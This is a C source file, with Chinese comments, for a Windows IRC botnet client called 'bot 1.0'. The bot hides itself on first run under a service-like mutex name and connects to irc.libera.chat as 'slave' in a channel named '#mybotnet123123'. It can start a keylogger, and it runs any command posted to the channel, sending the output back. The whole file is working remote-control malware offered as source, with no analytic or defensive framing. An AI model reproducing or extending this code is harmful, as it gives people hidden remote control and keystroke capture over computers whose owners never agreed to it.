#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include "header.h"

HANDLE hMutex;

BOOL is_already_running() {
    hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        bot_log("[!] Another instance is already running.\n");
        return TRUE;
    }
    return FALSE;
}




const char* version = "bot 1.0";
MessageBuffer msgBuffer;
SOCKET ircsock;
 
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{

    init_log_path();
    bot_log("version :%s",version);


    if (!is_hidden_bot() && HIDE_ON_ENTRY) {
        bot_log("Starting to hide myself...\n");
        copy_and_hide_bot();
        WSACleanup();
        return 0;
    }

    if (is_already_running())
        exit(0);

    const char* owner = "#mybotnet123123";
    const char* channel = "#mybotnet123123";
    int reconnectAttempts = 0;

    while (1) {
        ircsock = TCPhandler("irc.libera.chat", "slave");
        if (ircsock == INVALID_SOCKET) {
            bot_log("Failed to connect to IRC server. Attempt %d of %d...\n",
                reconnectAttempts + 1, MAX_RECONNECT_ATTEMPTS);
            reconnectAttempts++;
            Sleep(RECONNECT_INTERVAL);
            continue;
        }

        if (join_channel(channel) != 0)
            continue;

#ifdef KEYLOG_ON_ENTRY
        start_keylog();
#endif

        char buf[DEFAULT_BUFLEN];

        while (1) {
            int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
            if (n <= 0) {
                bot_log("Connection closed by server.\n");
                closesocket(ircsock);
                break;
            }

            buf[n] = '\0';  // Null-terminate

            // 处理 PING/PONG
            if (strncmp(buf, "PING", 4) == 0) {
                char pong[512];
                snprintf(pong, sizeof(pong), "PONG%s\r\n", buf + 4);
                send(ircsock, pong, (int)strlen(pong), 0);
                continue;
            }

            // 查找 PRIVMSG
            char* privmsg = strstr(buf, "PRIVMSG");
            if (privmsg != NULL) {

                // 查找消息内容起始位置（第一个 ':' 后）
                char* colon = strchr(privmsg, ':');
                if (colon != NULL) {
                    char* command = colon + 1;

                    char ansiCommand[DEFAULT_BUFLEN]; 
                    int res = Utf8ToAnsi(command, ansiCommand, sizeof(ansiCommand));
                    if (res < 0) {
                        bot_log("Error converting UTF-8 to ANSI: %d\n", res);
                        continue; // 转换失败，跳过该命令
                    }

                    // 用转换后的ANSI字符串代替原始command
                    command = ansiCommand;


                    // 去除前后空白字符
                    char* end = command + strlen(command);
                    while (end > command && (*(end - 1) == '\r' || *(end - 1) == '\n' || *(end - 1) == ' '))
                        end--;
                    *end = '\0';

                    // 初始化消息缓冲区
                    initMessageBuffer(&msgBuffer, owner);

                    bot_log("Received Command:\n%s\n", command);

                    // 解析并执行命令
                    ParsedCommand parsedCmd = parsecommand(command);
                    char* result = execute_parsed_command(parsedCmd, ircsock);

                    if (result) {
                        char* resultCopy = strdup(result);
                        char* token;
                        char* context = NULL;
                        token = strtok_s(resultCopy, "\n", &context);

                        while (token != NULL) {
                            appendToBuffer(&msgBuffer, ircsock, token);
                            token = strtok_s(NULL, "\n", &context);
                        }

                    
                        flushBuffer(&msgBuffer, ircsock);

                        free(resultCopy);
                        free(result);
                    }
                }
            }

            memset(buf, 0, sizeof(buf));
        }

        Sleep(RECONNECT_INTERVAL);
    }

    WSACleanup();
    return 0;
}